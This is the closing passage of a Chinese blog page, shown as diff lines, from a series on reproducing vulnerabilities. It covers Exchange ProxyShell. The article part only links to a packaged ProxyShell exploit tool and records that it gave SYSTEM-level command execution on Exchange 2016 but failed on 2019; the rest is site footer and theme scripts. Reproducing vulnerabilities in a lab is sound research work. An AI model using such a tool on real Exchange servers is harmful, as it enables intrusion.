+<td><a target="_blank" rel="noopener" href="https://github.com/ruyueattention/ProxyShell">ProxyShell</a></td>
+<td>上一篇博客博主打包的工具</td>
+</tr>
+</tbody>
+</table>
+<p>2016有时ok,whoami回显sysytem，2019失败：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/../Typora_images/Exchange_ProxyShell/image-20240311170519182.png" alt="image-20240311170519182" /></p>
+<hr />
+
+
+
+<div class="article-footer reveal fs14"></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">回顾上一篇</div><a href="/wiki/vuln_reproduction/Exchange_CVE-2021-26858_CVE-2021-27065.html">Exchange CVE-2021-26858/CVE-2021-27065</a></div><div class="item" id="next"><div class="note">接下来阅读</div><a href="/wiki/vuln_reproduction/Samba_CVE-2017-7494.html">Samba CVE-2017-7494</a></div></section></div>
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs14">博客</span><a href="/">近期发布</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a></div><div class="sitemap-group"><span class="fs14">wiki</span><a href="/wiki/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/">计算机基础</a><a href="/wiki/tags/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/">安全技术</a><a href="/wiki/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">环境搭建</a><a href="/wiki/tags/%E5%85%B6%E4%BB%96/">其他</a></div><div class="sitemap-group"><span class="fs14">关于</span><a href="/about/">关于</a></div></div><div class="text"><p>本站由 <a href="/">Misc</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.25.0">Stellar 1.25.0</a> 主题创建。<br />
+本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    
+<script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.25.0';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.25.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://gcore.jsdelivr.net/npm/jquery@3.6.2/dist/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js","memos":"/js/plugins/memos.js","marked":"/js/plugins/marked.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/vanilla-lazyload@17.8.3/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@10.3/swiper-bundle.min.css","js":"https://unpkg.com/swiper@10.3/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://gcore.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://gcore.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://gcore.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".fancybox img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied","toast":"复制成功"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
